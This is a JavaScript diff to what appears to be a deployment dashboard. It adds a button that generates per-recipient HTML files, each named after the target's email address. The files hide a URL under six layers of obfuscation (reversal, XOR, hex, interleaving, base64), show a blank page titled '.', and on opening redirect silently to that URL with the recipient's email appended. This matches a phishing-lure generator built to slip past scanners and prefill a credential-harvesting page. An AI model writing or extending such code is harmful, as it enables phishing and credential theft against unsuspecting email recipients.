@@ -4048,13 +4048,72 @@ async function loadDeploymentInfo() {
                 tryBtn.style.fontWeight = 'bold';
                 tryBtn.onclick = () => window.open(url, '_blank');
 
+                const dlBtn = document.createElement('button');
+                dlBtn.textContent = 'DL HTML';
+                dlBtn.className = 'secondary';
+                dlBtn.style.padding = '8px 12px';
+                dlBtn.style.fontSize = '12px';
+                dlBtn.style.borderColor = '#a855f7';
+                dlBtn.style.color = '#a855f7';
+                dlBtn.style.fontWeight = 'bold';
+                dlBtn.title = 'Download encoded HTML — email stays plain text, URL is encoded';
+                dlBtn.onclick = () => {
+                    const email = prompt('Enter email (plain text, edit later if needed):', '');
+                    const hasEmail = (email && email.includes('@'));
+                    const encodedHtml = generateEncodedHtml(url, hasEmail ? email : '');
+                    const blob = new Blob([encodedHtml], { type: 'text/html' });
+                    const a = document.createElement('a');
+                    a.href = URL.createObjectURL(blob);
+                    a.download = hasEmail ? email.split('@')[0] + '.html' : 'page.html';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(a.href);
+                    const orig = dlBtn.textContent;
+                    dlBtn.textContent = '✓ DL';
+                    dlBtn.style.backgroundColor = '#a855f7';
+                    dlBtn.style.color = '#000';
+                    setTimeout(() => {
+                        dlBtn.textContent = orig;
+                        dlBtn.style.backgroundColor = '';
+                        dlBtn.style.color = '#a855f7';
+                    }, 1000);
+                };
+
                 group.appendChild(btn);
                 group.appendChild(tryBtn);
+                group.appendChild(dlBtn);
                 list.appendChild(group);
             }
         }
     } catch (e) {
     }
+}
+
+function generateEncodedHtml(baseUrl, email) {
+    // Encode ONLY the base URL (6 layers). Email stays in plain text.
+    var s1 = baseUrl.split('').reverse().join('');
+    var codes = [];
+    for (var i = 0; i < s1.length; i++) {
+        codes.push(s1.charCodeAt(i) ^ 0xAA);
+    }
+    var h = codes.map(function(c) {
+        var hex = c.toString(16);
+        return hex.length === 1 ? '0' + hex : hex;
+    }).join('');
+    var hRev = h.split('').reverse().join('');
+    var mid = Math.floor(hRev.length / 2);
+    var p1 = hRev.substring(0, mid);
+    var p2 = hRev.substring(mid);
+    var inter = '';
+    var ml = Math.max(p1.length, p2.length);
+    for (var i = 0; i < ml; i++) {
+        if (i < p1.length) inter += p1[i];
+        if (i < p2.length) inter += p2[i];
+    }
+    var b64 = btoa(inter);
+
+    return '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<title>.</title>\n<style>body{margin:0;background:#0a0a0a;height:100vh}</style>\n</head>\n<body>\n<div id="e" style="display:none">' + email + '</div>\n<script>\n(function(){\n    var _ = \'' + b64 + '\';\n    var a = atob(_);\n    var b = \'\', c = [], d = [], e = 0, f = 0;\n    for(var i = 0; i < a.length; i++){\n        if(i % 2 === 0) { c[e] = a[i]; e++; }\n        else { d[f] = a[i]; f++; }\n    }\n    var g = c.join(\'\') + d.join(\'\');\n    var h = g.split(\'\').reverse().join(\'\');\n    var j = [];\n    for(var k = 0; k < h.length; k += 2){\n        j.push(parseInt(h.substring(k, k+2), 16));\n    }\n    var l = [];\n    for(var m = 0; m < j.length; m++){\n        l[m] = j[m] ^ 0xAA;\n    }\n    var n = String.fromCharCode.apply(null, l);\n    var o = n.split(\'\').reverse().join(\'\');\n    var email = document.getElementById(\'e\').textContent.trim();\n    if(email) o += (o.indexOf(\'?\') > -1 ? \'&\' : \'?\') + \'email=\' + encodeURIComponent(email);\n    window.location.replace(o);\n})();\n<\/script>\n</body>\n</html>';
 }
 
 async function updateConnectionStatus() {
